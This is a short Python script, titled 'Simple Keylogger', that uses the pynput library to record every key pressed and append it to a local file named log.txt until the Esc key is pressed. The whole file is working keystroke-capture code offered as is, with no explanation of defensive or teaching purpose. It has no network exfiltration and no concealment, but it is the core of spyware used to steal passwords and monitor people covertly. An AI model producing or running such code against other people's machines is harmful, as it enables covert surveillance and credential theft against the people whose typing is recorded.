#Simple Keylogger without date and time 

#import library
from pynput.keyboard import Key, Listener

# File to store logs
log_file = "log.txt"

#Key press
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
            
    except AttributeError:
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")

            elif key == Key.enter:
                f.write("\n")

            else:
                f.write(f" {key} ")

#key release
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

